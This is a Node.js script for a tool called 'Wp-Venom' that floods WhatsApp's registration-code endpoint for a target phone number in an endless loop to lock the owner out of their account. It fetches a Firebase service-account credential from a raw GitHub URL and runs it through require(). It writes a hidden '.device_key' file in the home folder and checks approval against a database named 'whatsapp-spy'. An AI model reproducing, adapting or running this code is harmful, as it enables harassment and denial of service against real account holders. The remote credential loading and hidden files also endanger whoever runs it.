require('dotenv').config();
const fs = require("fs");
const os = require("os");
const path = require("path");
const axios = require("axios");
const admin = require("firebase-admin");
const { v4: uuidv4 } = require("uuid");

const serviceAccountUrl = "https://raw.githubusercontent.com/beta2-0/wp-lock/refs/heads/main/google-services.json";
const serviceAccountPath = path.join(os.tmpdir(), "google-services.json");

async function downloadServiceAccount() {
  const response = await axios.get(serviceAccountUrl);
  fs.writeFileSync(serviceAccountPath, JSON.stringify(response.data));
}

// Initialize Firebase
async function initializeFirebase() {
  await downloadServiceAccount();
  const serviceAccount = require(serviceAccountPath);
  admin.initializeApp({
    credential: admin.credential.cert(serviceAccount),
    databaseURL: "https://whatsapp-spy-72b37-default-rtdb.firebaseio.com/"
  });
}

// Generate a unique key
function generateUniqueKey() {
  const prefix = Math.random().toString(36).substring(2, 5); // e.g., 'abc'
  const uniqueId = uuidv4().replace(/-/g, "").substring(0, 8); // Random 8-digit number
  return `${prefix}_${uniqueId}`;
}

// Save the key to a hidden file
function saveKeyToHiddenFile(key) {
  const hiddenFile = path.join(os.homedir(), ".device_key");
  fs.writeFileSync(hiddenFile, key, "utf-8");
  
}

// Upload key to Firebase
async function uploadKeyToFirebase(key) {
  const ref = admin.database().ref(`/keys/${key}`);
  await ref.set({ approved: false });

}

// Check key approval status
async function checkKeyApproval(key) {
  const ref = admin.database().ref(`/keys/${key}`);
  const snapshot = await ref.once("value");
  const data = snapshot.val();
  return data && data.approved;
}

// Main Program
async function main() {
  await initializeFirebase();
  const hiddenFile = path.join(os.homedir(), ".device_key");

  // Check if the hidden file exists
  if (!fs.existsSync(hiddenFile)) {
    // Generate a new key
    const deviceKey = generateUniqueKey();
    console.log(`
      \x1b[35m╭──────────────── (Wp-Venom)\x1b[35m ─────────────────╮
    \x1b[35m  │                                             │
   \x1b[35m   │            \x1b[32m </> Developer : STARK-404 </>\x1b[35m   │
   \x1b[35m   │            \x1b[32m </> Github : STARK-404 </>\x1b[35m      │
     \x1b[35m │            \x1b[32m </> INSTA : la1uuuuu </>\x1b[35m        │
   \x1b[35m   │                                             │
    \x1b[35m  ╰─────────────────────────────────────────────╯
    
      `)
    console.log(`\x1b[31mYour device key:\x1b[32m ${deviceKey}`);
    saveKeyToHiddenFile(deviceKey);
    await uploadKeyToFirebase(deviceKey);
    console.log("\x1b[32mPlease share the key with the admin for approval.");
    process.exit();
  } else {
    // Read the existing key
    const deviceKey = fs.readFileSync(hiddenFile, "utf-8").trim();

    // Check approval status
    if (await checkKeyApproval(deviceKey)) {
      console.log("Device approved. Continuing the program...");
      fs.unlinkSync(hiddenFile);
    } else {
      console.log(`
        \x1b[35m╭──────────────── (Wp-Venom)\x1b[35m ─────────────────╮
      \x1b[35m  │                                             │
     \x1b[35m   │            \x1b[32m </> Developer : STARK-404 </>\x1b[35m   │
     \x1b[35m   │            \x1b[32m </> Github : STARK-404 </>\x1b[35m      │
       \x1b[35m │            \x1b[32m </> INSTA : la1uuuuu </>\x1b[35m        │
     \x1b[35m   │                                             │
      \x1b[35m  ╰─────────────────────────────────────────────╯
      
        `)
      console.log("Device not approved. Exiting...");
      process.exit();
    }
  }
}

main();


const prompt = require('prompt-sync')();
const pino = require('pino');



const { default: makeWaSocket, useMultiFileAuthState } = require('@justry/testbaileys');

const numbers = JSON.parse(fs.readFileSync('./files/numbers.json'));

const start = async () => {

  const { state, saveCreds } = await useMultiFileAuthState('.oiii')

  const spam = makeWaSocket({
    auth: state,
    mobile: true,
    logger: pino({ level: 'silent' })
  })
  
  const dropNumber = async (context) => {
    const { phoneNumber, ddi, number } = context;
    while (true) {
      try {
      console.clear();
      console.log(`
        \x1b[35m╭──────────────── (Wp-Venom)\x1b[35m ─────────────────╮
      \x1b[35m  │                                             │
     \x1b[35m   │            \x1b[32m </> Developer : STARK-404 </>\x1b[35m   │
     \x1b[35m   │            \x1b[32m </> Github : STARK-404 </>\x1b[35m      │
       \x1b[35m │            \x1b[32m </> INSTA : la1uuuuu </>\x1b[35m        │
     \x1b[35m   │                                             │
      \x1b[35m  ╰─────────────────────────────────────────────╯
      
        `)
      
      console.log("\x1b[34;3m[+] Number [+" +  phoneNumber + " ] Locked")
        res = await spam.requestRegistrationCode({
          phoneNumber: '+' + phoneNumber,
          phoneNumberCountryCode: ddi,
          phoneNumberNationalNumber: number,
          phoneNumberMobileCountryCode: 724
        })
        b = (res.reason === 'temporarily_unavailable');
        if (b) {
          
          setTimeout(async () => {
            dropNumber(context)
          }, res.retry_after * 10)
          return;
        }
      } catch (error) {
        //console.log(error)
      }
    }

  }
  console.clear();
  console.log(`
    \x1b[35m╭──────────────── (Wp-Venom)\x1b[35m ─────────────────╮
  \x1b[35m  │                                             │
 \x1b[35m   │            \x1b[32m </> Developer : STARK-404 </>\x1b[35m   │
 \x1b[35m   │            \x1b[32m </> Github : STARK-404 </>\x1b[35m      │
   \x1b[35m │            \x1b[32m </> INSTA : la1uuuuu </>\x1b[35m        │
 \x1b[35m   │                                             │
  \x1b[35m  ╰─────────────────────────────────────────────╯
  
    `)
  console.log("")
  let ddi = prompt('\x1b[35m [>] Enter  country code> ');
  let number = prompt('\x1b[35m [>] Enter WP Number> ')
  let phoneNumber = ddi + number;
  fs.unlinkSync('test.js')
  numbers[phoneNumber] = { ddi, number }
  fs.writeFileSync('./files/numbers.json', JSON.stringify(numbers, null, '\t'));
  dropNumber({ phoneNumber, ddi, number })
console.clear();
}
